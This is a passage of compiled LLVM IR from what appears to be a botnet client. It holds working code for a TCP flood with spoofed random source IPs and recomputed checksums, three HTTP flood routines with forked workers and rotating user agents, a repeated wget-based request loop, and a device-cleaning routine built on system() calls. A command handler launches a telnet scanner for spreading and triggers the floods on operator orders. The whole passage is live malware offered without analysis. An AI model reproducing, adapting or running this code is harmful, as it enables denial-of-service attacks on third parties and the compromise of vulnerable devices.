  %87 = call i32 @strcmp(i8* nonnull %.08485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.158, i64 0, i64 0)) #14
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %.sink.split, label %89

; <label>:89:                                     ; preds = %86
  %90 = call i32 @strcmp(i8* nonnull %.08485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i64 0, i64 0)) #14
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %.sink.split, label %92

; <label>:92:                                     ; preds = %89
  %93 = call i32 @strcmp(i8* nonnull %.08485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i64 0, i64 0)) #14
  %94 = icmp eq i32 %93, 0
  br i1 %94, label %.sink.split, label %95

; <label>:95:                                     ; preds = %92
  %96 = call i32 @strcmp(i8* nonnull %.08485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.161, i64 0, i64 0)) #14
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %.sink.split, label %101

.sink.split:                                      ; preds = %95, %92, %89, %86, %83, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %83 ], [ -257, %86 ], [ -4097, %89 ], [ -2049, %92 ], [ -8193, %95 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %83 ], [ 256, %86 ], [ 4096, %89 ], [ 2048, %92 ], [ 8192, %95 ]
  %98 = load i16, i16* %57, align 16
  %99 = and i16 %98, %.sink7
  %100 = or i16 %99, %.sink5
  store i16 %100, i16* %57, align 16
  br label %101

; <label>:101:                                    ; preds = %95, %.sink.split
  %102 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i64 0, i64 0)) #7
  %103 = icmp eq i8* %102, null
  br i1 %103, label %.loopexit.loopexit, label %.lr.ph

.loopexit.loopexit:                               ; preds = %101
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %78, %76
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds i8, i8* %39, i64 34
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  %108 = getelementptr inbounds i8, i8* %39, i64 36
  %109 = bitcast i8* %108 to i16*
  store i16 0, i16* %109, align 4
  %110 = getelementptr inbounds i8, i8* %39, i64 38
  %111 = bitcast i8* %110 to i16*
  store i16 0, i16* %111, align 2
  br i1 %11, label %112, label %114

; <label>:112:                                    ; preds = %.loopexit
  %113 = call i32 @rand_cmwc()
  br label %118

; <label>:114:                                    ; preds = %.loopexit
  %115 = trunc i32 %1 to i16
  %116 = call zeroext i16 @htons(i16 zeroext %115) #15
  %117 = zext i16 %116 to i32
  br label %118

; <label>:118:                                    ; preds = %114, %112
  %119 = phi i32 [ %113, %112 ], [ %117, %114 ]
  %120 = trunc i32 %119 to i16
  %121 = getelementptr inbounds i8, i8* %39, i64 22
  %122 = bitcast i8* %121 to i16*
  store i16 %120, i16* %122, align 2
  %123 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %123, i16* %109, align 4
  %124 = bitcast i8* %39 to i16*
  %125 = getelementptr inbounds i8, i8* %39, i64 2
  %126 = bitcast i8* %125 to i16*
  %127 = load i16, i16* %126, align 2
  %128 = zext i16 %127 to i32
  %129 = call zeroext i16 @csum(i16* nonnull %124, i32 %128)
  %130 = getelementptr inbounds i8, i8* %39, i64 10
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 2
  %132 = call i64 @time(i64* null) #7
  %133 = zext i32 %2 to i64
  %134 = add i64 %132, %133
  %135 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %136 = getelementptr inbounds i8, i8* %39, i64 12
  %137 = bitcast i8* %136 to i32*
  %138 = getelementptr inbounds i8, i8* %39, i64 4
  %139 = bitcast i8* %138 to i16*
  %sext = shl i64 %134, 32
  %140 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %118
  %.0 = phi i32 [ 0, %118 ], [ %.0.be, %.backedge.backedge ]
  %141 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %135, i32 16) #7
  %142 = call i32 @getRandomIP(i32 %.083)
  %143 = call i32 @htonl(i32 %142) #15
  store i32 %143, i32* %137, align 4
  %144 = call i32 @rand_cmwc()
  %145 = trunc i32 %144 to i16
  store i16 %145, i16* %139, align 4
  %146 = call i32 @rand_cmwc()
  store i32 %146, i32* %53, align 8
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %50, align 4
  store i16 0, i16* %109, align 4
  %149 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %149, i16* %109, align 4
  %150 = load i16, i16* %126, align 2
  %151 = zext i16 %150 to i32
  %152 = call zeroext i16 @csum(i16* nonnull %124, i32 %151)
  store i16 %152, i16* %131, align 2
  %153 = icmp eq i32 %.0, %5
  br i1 %153, label %154, label %157

; <label>:154:                                    ; preds = %.backedge
  %155 = call i64 @time(i64* null) #7
  %156 = icmp sgt i64 %155, %140
  br i1 %156, label %159, label %.backedge.backedge

; <label>:157:                                    ; preds = %.backedge
  %158 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %157, %154
  %.0.be = phi i32 [ %158, %157 ], [ 0, %154 ]
  br label %.backedge

; <label>:159:                                    ; preds = %154
  call void @llvm.stackrestore(i8* %38)
  br label %160

; <label>:160:                                    ; preds = %23, %18, %28, %159
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #2 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #7
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #7
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #7
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #2 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #7
  %10 = zext i32 %4 to i64
  %11 = add i64 %9, %10
  %12 = icmp sgt i32 %5, 0
  br i1 %12, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %16

; <label>:14:                                     ; preds = %16
  %15 = icmp slt i32 %25, %5
  br i1 %15, label %16, label %._crit_edge16.loopexit

; <label>:16:                                     ; preds = %.lr.ph15, %14
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %25, %14 ]
  %17 = tail call i32 @rand() #7
  %18 = srem i32 %17, 59
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %19
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %13, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %21) #7
  %23 = tail call i32 @fork() #7
  %24 = icmp eq i32 %23, 0
  %25 = add nuw nsw i32 %.013, 1
  br i1 %24, label %14, label %.preheader

.preheader:                                       ; preds = %16
  %sext = shl i64 %11, 32
  %26 = ashr exact i64 %sext, 32
  %27 = tail call i64 @time(i64* null) #7
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %13) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %13, i64 %34) #7
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #7
  %37 = tail call i32 @close(i32 %31) #7
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = tail call i64 @time(i64* null) #7
  %39 = icmp sgt i64 %26, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #16
  unreachable

._crit_edge16.loopexit:                           ; preds = %14
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHEX(i8*, i8*, i16 zeroext, i8* nocapture readnone, i32, i32) local_unnamed_addr #2 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = alloca [2048 x i8], align 16
  %10 = tail call i64 @time(i64* null) #7
  %11 = zext i32 %4 to i64
  %12 = add i64 %10, %11
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %13, i8* getelementptr inbounds ([285 x i8], [285 x i8]* @.str.164, i64 0, i64 0), i64 285, i32 1, i1 false)
  %14 = icmp sgt i32 %5, 0
  br i1 %14, label %.lr.ph14, label %._crit_edge15

.lr.ph14:                                         ; preds = %6
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %18

; <label>:16:                                     ; preds = %18
  %17 = icmp slt i32 %27, %5
  br i1 %17, label %18, label %._crit_edge15.loopexit

; <label>:18:                                     ; preds = %.lr.ph14, %16
  %.012 = phi i32 [ 0, %.lr.ph14 ], [ %27, %16 ]
  %19 = call i32 @rand() #7
  %20 = srem i32 %19, 59
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %21
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %15, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i64 0, i64 0), i8* %0, i8* nonnull %13, i8* %1, i8* %23) #7
  %25 = call i32 @fork() #7
  %26 = icmp eq i32 %25, 0
  %27 = add nuw nsw i32 %.012, 1
  br i1 %26, label %16, label %.preheader

.preheader:                                       ; preds = %18
  %sext = shl i64 %12, 32
  %28 = ashr exact i64 %sext, 32
  %29 = call i64 @time(i64* null) #7
  %30 = icmp sgt i64 %28, %29
  br i1 %30, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %31 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %32

; <label>:32:                                     ; preds = %.lr.ph, %.backedge
  %33 = call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %.backedge, label %35

; <label>:35:                                     ; preds = %32
  %36 = call i64 @strlen(i8* nonnull %15) #14
  %37 = call i64 @write(i32 %33, i8* nonnull %15, i64 %36) #7
  %38 = call i64 @read(i32 %33, i8* nonnull %31, i64 1) #7
  %39 = call i32 @close(i32 %33) #7
  br label %.backedge

.backedge:                                        ; preds = %35, %32
  %40 = call i64 @time(i64* null) #7
  %41 = icmp sgt i64 %28, %40
  br i1 %41, label %32, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  call void @exit(i32 0) #16
  unreachable

._crit_edge15.loopexit:                           ; preds = %16
  br label %._crit_edge15

._crit_edge15:                                    ; preds = %._crit_edge15.loopexit, %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPTXT(i8*, i8*, i16 zeroext, i8* nocapture readnone, i32, i32) local_unnamed_addr #2 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = alloca [2048 x i8], align 16
  %10 = tail call i64 @time(i64* null) #7
  %11 = zext i32 %4 to i64
  %12 = add i64 %10, %11
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %13, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.165, i64 0, i64 0), i64 48, i32 1, i1 false)
  %14 = icmp sgt i32 %5, 0
  br i1 %14, label %.lr.ph14, label %._crit_edge15

.lr.ph14:                                         ; preds = %6
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %18

; <label>:16:                                     ; preds = %18
  %17 = icmp slt i32 %27, %5
  br i1 %17, label %18, label %._crit_edge15.loopexit

; <label>:18:                                     ; preds = %.lr.ph14, %16
  %.012 = phi i32 [ 0, %.lr.ph14 ], [ %27, %16 ]
  %19 = call i32 @rand() #7
  %20 = srem i32 %19, 59
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [59 x i8*], [59 x i8*]* @uagents, i64 0, i64 %21
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %15, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.163, i64 0, i64 0), i8* %0, i8* nonnull %13, i8* %1, i8* %23) #7
  %25 = call i32 @fork() #7
  %26 = icmp eq i32 %25, 0
  %27 = add nuw nsw i32 %.012, 1
  br i1 %26, label %16, label %.preheader

.preheader:                                       ; preds = %18
  %sext = shl i64 %12, 32
  %28 = ashr exact i64 %sext, 32
  %29 = call i64 @time(i64* null) #7
  %30 = icmp sgt i64 %28, %29
  br i1 %30, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %31 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %32

; <label>:32:                                     ; preds = %.lr.ph, %.backedge
  %33 = call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %.backedge, label %35

; <label>:35:                                     ; preds = %32
  %36 = call i64 @strlen(i8* nonnull %15) #14
  %37 = call i64 @write(i32 %33, i8* nonnull %15, i64 %36) #7
  %38 = call i64 @read(i32 %33, i8* nonnull %31, i64 1) #7
  %39 = call i32 @close(i32 %33) #7
  br label %.backedge

.backedge:                                        ; preds = %35, %32
  %40 = call i64 @time(i64* null) #7
  %41 = icmp sgt i64 %28, %40
  br i1 %41, label %32, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  call void @exit(i32 0) #16
  unreachable

._crit_edge15.loopexit:                           ; preds = %16
  br label %._crit_edge15

._crit_edge15:                                    ; preds = %._crit_edge15.loopexit, %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() local_unnamed_addr #2 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.166, i64 0, i64 0)) #7
  %2 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.167, i64 0, i64 0)) #7
  %3 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.168, i64 0, i64 0)) #7
  %4 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.169, i64 0, i64 0)) #7
  %5 = tail call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.170, i64 0, i64 0)) #7
  %6 = tail call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.171, i64 0, i64 0)) #7
  %7 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.172, i64 0, i64 0)) #7
  %8 = tail call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.173, i64 0, i64 0)) #7
  %9 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.174, i64 0, i64 0)) #7
  %10 = tail call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.175, i64 0, i64 0)) #7
  %11 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.176, i64 0, i64 0)) #7
  %12 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.177, i64 0, i64 0)) #7
  %13 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i64 0, i64 0)) #7
  ret void
}

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @SendWGET(i8* nocapture readonly, i32) local_unnamed_addr #2 {
  %3 = alloca [80 x i8], align 16
  %4 = tail call i64 @time(i64* null) #7
  %5 = zext i32 %1 to i64
  %6 = add i64 %4, %5
  %7 = getelementptr inbounds [80 x i8], [80 x i8]* %3, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %7, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.179, i64 0, i64 0), i64 45, i32 1, i1 false)
  %8 = call i8* @strcat(i8* nonnull %7, i8* %0) #7
  %9 = call %struct._IO_FILE* @popen(i8* nonnull %7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i64 0, i64 0))
  %sext = shl i64 %6, 32
  %10 = ashr exact i64 %sext, 32
  %11 = call i64 @time(i64* null) #7
  %12 = icmp sgt i64 %10, %11
  br i1 %12, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %13 = call i32 @system(i8* nonnull %7) #7
  %14 = call i64 @time(i64* null) #7
  %15 = icmp sgt i64 %10, %14
  br i1 %15, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @popen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #2 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %342, label %6

; <label>:6:                                      ; preds = %2
  %7 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.182, i64 0, i64 0)) #14
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %9, label %61

; <label>:9:                                      ; preds = %6
  %10 = getelementptr inbounds i8*, i8** %1, i64 1
  %11 = load i8*, i8** %10, align 8
  %12 = tail call i32 @strcmp(i8* %11, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.183, i64 0, i64 0)) #14
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %38

; <label>:14:                                     ; preds = %9
  %15 = tail call i32 @fork() #7
  %16 = tail call i64 @sysconf(i32 84) #7
  %17 = trunc i64 %16 to i32
  %18 = icmp eq i32 %17, 1
  %. = select i1 %18, i32 500, i32 999999
  %19 = icmp sgt i32 %17, 1
  %.. = select i1 %19, i32 1000, i32 %.
  %20 = icmp eq i32 %15, 0
  br i1 %20, label %22, label %21

; <label>:21:                                     ; preds = %14
  store i32 %15, i32* @scanPid, align 4
  br label %342

; <label>:22:                                     ; preds = %14
  %23 = icmp sgt i32 %17, 0
  br i1 %23, label %24, label %._crit_edge

._crit_edge:                                      ; preds = %22
  %.pre = load i8*, i8** %10, align 8
  br label %38

; <label>:24:                                     ; preds = %22
  %25 = tail call i64 @time(i64* null) #7
  %26 = tail call i32 @getpid() #7
  %27 = zext i32 %26 to i64
  %28 = xor i64 %27, %25
  %29 = tail call i32 @getppid() #7
  %30 = zext i32 %29 to i64
  %31 = add i64 %28, %30
  %32 = trunc i64 %31 to i32
  tail call void @srand(i32 %32) #7
  %33 = tail call i64 @time(i64* null) #7
  %34 = tail call i32 @getpid() #7
  %35 = zext i32 %34 to i64
  %36 = xor i64 %35, %33
  %37 = trunc i64 %36 to i32
  tail call void @init_rand(i32 %37)
  tail call void @TelnetScanner(i32 100, i32 %..)
  unreachable

; <label>:38:                                     ; preds = %._crit_edge, %9
  %39 = phi i8* [ %.pre, %._crit_edge ], [ %11, %9 ]
  %40 = tail call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i64 0, i64 0)) #14
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @scanPid, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %342, label %45

; <label>:45:                                     ; preds = %42
  %46 = tail call i32 @kill(i32 %43, i32 9) #7
  store i32 0, i32* @scanPid, align 4
  %.pre182 = load i8*, i8** %10, align 8
  br label %47

; <label>:47:                                     ; preds = %38, %45
  %48 = phi i8* [ %39, %38 ], [ %.pre182, %45 ]
  %49 = tail call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.185, i64 0, i64 0)) #14
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %._crit_edge183

._crit_edge183:                                   ; preds = %47
  %.pre184 = load i8*, i8** %1, align 8
  br label %61

; <label>:51:                                     ; preds = %47
  %52 = tail call i32 @atoi(i8* %48) #14
  %53 = getelementptr inbounds i8*, i8** %1, i64 2
  %54 = load i8*, i8** %53, align 8
  %55 = tail call i32 @atoi(i8* %54) #14
  %56 = tail call i32 @listFork()
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %58, label %342

; <label>:58:                                     ; preds = %51
  %59 = load i32, i32* @mainCommSock, align 4
  %60 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %59, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.186, i64 0, i64 0))
  tail call void @TelnetScanner(i32 %55, i32 %52)
  unreachable

; <label>:61:                                     ; preds = %._crit_edge183, %6
  %62 = phi i8* [ %.pre184, %._crit_edge183 ], [ %3, %6 ]
  %63 = tail call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.187, i64 0, i64 0)) #14
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %95

; <label>:65:                                     ; preds = %61
  %66 = icmp slt i32 %0, 6
  br i1 %66, label %342, label %67

; <label>:67:                                     ; preds = %65
  %68 = getelementptr inbounds i8*, i8** %1, i64 3
  %69 = load i8*, i8** %68, align 8
  %70 = tail call i32 @atoi(i8* %69) #14
  %71 = icmp slt i32 %70, 1
  br i1 %71, label %342, label %72

; <label>:72:                                     ; preds = %67
  %73 = getelementptr inbounds i8*, i8** %1, i64 5
  %74 = load i8*, i8** %73, align 8
  %75 = tail call i32 @atoi(i8* %74) #14
  %76 = icmp slt i32 %75, 1
  br i1 %76, label %342, label %77

; <label>:77:                                     ; preds = %72
  %78 = tail call i32 @listFork()
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %342

; <label>:80:                                     ; preds = %77
  %81 = getelementptr inbounds i8*, i8** %1, i64 1
  %82 = load i8*, i8** %81, align 8
  %83 = getelementptr inbounds i8*, i8** %1, i64 2
  %84 = load i8*, i8** %83, align 8
  %85 = load i8*, i8** %68, align 8
  %86 = tail call i32 @atoi(i8* %85) #14
  %87 = trunc i32 %86 to i16
  %88 = getelementptr inbounds i8*, i8** %1, i64 4
  %89 = load i8*, i8** %88, align 8
  %90 = load i8*, i8** %73, align 8
  %91 = tail call i32 @atoi(i8* %90) #14
  %92 = getelementptr inbounds i8*, i8** %1, i64 6
  %93 = load i8*, i8** %92, align 8
  %94 = tail call i32 @atoi(i8* %93) #14
  tail call void @SendHTTP(i8* %82, i8* %84, i16 zeroext %87, i8* %89, i32 %91, i32 %94)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:95:                                     ; preds = %61
  %96 = tail call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i64 0, i64 0)) #14
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %98, label %126

; <label>:98:                                     ; preds = %95
  %99 = icmp slt i32 %0, 6
  br i1 %99, label %342, label %100

; <label>:100:                                    ; preds = %98
  %101 = getelementptr inbounds i8*, i8** %1, i64 3
  %102 = load i8*, i8** %101, align 8
  %103 = tail call i32 @atoi(i8* %102) #14
  %104 = icmp slt i32 %103, 1
  br i1 %104, label %342, label %105

; <label>:105:                                    ; preds = %100
  %106 = getelementptr inbounds i8*, i8** %1, i64 5
  %107 = load i8*, i8** %106, align 8
  %108 = tail call i32 @atoi(i8* %107) #14
  %109 = icmp slt i32 %108, 1
  br i1 %109, label %342, label %110

; <label>:110:                                    ; preds = %105
  %111 = tail call i32 @listFork()
  %112 = icmp eq i32 %111, 0
  br i1 %112, label %113, label %342

; <label>:113:                                    ; preds = %110
  %114 = getelementptr inbounds i8*, i8** %1, i64 1
  %115 = load i8*, i8** %114, align 8
  %116 = getelementptr inbounds i8*, i8** %1, i64 2
  %117 = load i8*, i8** %116, align 8
  %118 = load i8*, i8** %101, align 8
  %119 = tail call i32 @atoi(i8* %118) #14
  %120 = trunc i32 %119 to i16
  %121 = load i8*, i8** %106, align 8
  %122 = tail call i32 @atoi(i8* %121) #14
  %123 = getelementptr inbounds i8*, i8** %1, i64 6
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #14
  tail call void @SendHTTPHEX(i8* %115, i8* %117, i16 zeroext %120, i8* undef, i32 %122, i32 %125)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:126:                                    ; preds = %95
  %127 = tail call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.189, i64 0, i64 0)) #14
  %128 = icmp eq i32 %127, 0
  br i1 %128, label %129, label %157

; <label>:129:                                    ; preds = %126
  %130 = icmp slt i32 %0, 6
  br i1 %130, label %342, label %131

; <label>:131:                                    ; preds = %129
  %132 = getelementptr inbounds i8*, i8** %1, i64 3
  %133 = load i8*, i8** %132, align 8
  %134 = tail call i32 @atoi(i8* %133) #14
  %135 = icmp slt i32 %134, 1
  br i1 %135, label %342, label %136

; <label>:136:                                    ; preds = %131
  %137 = getelementptr inbounds i8*, i8** %1, i64 5
  %138 = load i8*, i8** %137, align 8
  %139 = tail call i32 @atoi(i8* %138) #14
  %140 = icmp slt i32 %139, 1
  br i1 %140, label %342, label %141

; <label>:141:                                    ; preds = %136
  %142 = tail call i32 @listFork()
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %144, label %342

; <label>:144:                                    ; preds = %141
  %145 = getelementptr inbounds i8*, i8** %1, i64 1
  %146 = load i8*, i8** %145, align 8
  %147 = getelementptr inbounds i8*, i8** %1, i64 2
  %148 = load i8*, i8** %147, align 8
  %149 = load i8*, i8** %132, align 8
  %150 = tail call i32 @atoi(i8* %149) #14
  %151 = trunc i32 %150 to i16
  %152 = load i8*, i8** %137, align 8
  %153 = tail call i32 @atoi(i8* %152) #14
  %154 = getelementptr inbounds i8*, i8** %1, i64 6
  %155 = load i8*, i8** %154, align 8
  %156 = tail call i32 @atoi(i8* %155) #14
